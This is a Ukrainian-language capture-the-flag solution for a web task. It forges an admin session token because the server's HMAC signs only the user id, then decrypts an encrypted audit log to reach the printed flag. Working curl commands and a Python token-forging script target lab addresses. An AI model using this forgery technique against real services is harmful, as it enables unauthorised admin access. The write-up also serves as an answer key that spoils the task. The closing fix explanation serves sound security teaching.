# 12. Token Forge (300 балів) — розв'язок

Прапор: `CTF{t0k3n_subst1tut10n_4nd_3ncrypt3d_l0gs}`

## Що дано

- Сайт: `http://172.28.0.22:5000` через VPN або `http://10.10.15.124:8012` напряму.
- Тестовий оператор: `test` / `test123`.
- Є реєстрація нових операторів, але всі вони отримують роль `user`.
- Після входу на `/dashboard` показується токен сесії (cookie `session`).

## Вразливість

Токен має вигляд:

```text
base64url({"uid":1,"name":"test","role":"user","iat":...}).<hmac>
```

Підпис обчислюється як `HMAC-SHA256(key, str(uid))` — **тільки від `uid`**.
Поля `name` і `role` не входять у підпис, але сервер довіряє їм із payload.

Отже, достатньо змінити `role` на `admin`, залишивши старий підпис. Підпис
залишиться валідним, бо `uid` не змінився.

## Крок 1. Увійти тестовим оператором

```bash
curl -i -c cookies.txt \
  -d 'name=test&password=test123' \
  http://172.28.0.22:5000/login
```

Відкрийте `/dashboard` у браузері або візьміть токен із cookie:

```bash
grep session cookies.txt
```

## Крок 2. Підмінити роль

```python
import base64
import json

token = "PASTE_TOKEN_HERE"
body, signature = token.rsplit(".", 1)

payload = json.loads(
    base64.urlsafe_b64decode(body + "=" * (-len(body) % 4))
)
payload["role"] = "admin"

new_body = base64.urlsafe_b64encode(
    json.dumps(payload, separators=(",", ":")).encode()
).rstrip(b"=").decode()

forged = f"{new_body}.{signature}"
print(forged)
```

Підставте `forged` у cookie `session`:

```bash
curl -b "session=$FORGED" http://172.28.0.22:5000/admin
```

Повинна відкритися адмін-панель із посиланням на `audit.log.enc`.

## Крок 3. Розшифрувати журнал

Адмін-панель сама підказує параметри:

- AES-256-CBC, PKCS#7;
- ключ — `SHA-256(session token)`, 32 сирі байти;
- IV — перші 16 байтів файлу.

```bash
curl -b "session=$FORGED" \
  -o audit.log.enc \
  http://172.28.0.22:5000/admin/audit.log.enc
```

```python
import hashlib
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

token = "FORGED_TOKEN"
data = open("audit.log.enc", "rb").read()

key = hashlib.sha256(token.encode("utf-8")).digest()
iv, ciphertext = data[:16], data[16:]

decryptor = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()
padded = decryptor.update(ciphertext) + decryptor.finalize()

unpadder = padding.PKCS7(128).unpadder()
plaintext = unpadder.update(padded) + unpadder.finalize()
print(plaintext.decode("utf-8"))
```

У журналі буде рядок:

```text
[...] FLAG CTF{t0k3n_subst1tut10n_4nd_3ncrypt3d_l0gs}
```

## Прапор

```text
CTF{t0k3n_subst1tut10n_4nd_3ncrypt3d_l0gs}
```

## Чому це працює

Підпис захищає лише ідентифікатор користувача. Сервер перевіряє
`HMAC(uid) == signature`, а потім бере `role` з того самого незахищеного
payload. Виправлення: підписувати канонічний JSON усього payload (або
використовувати перевірений JWT із захистом від підміни полів), а роль брати
з бази даних, а не з токена.
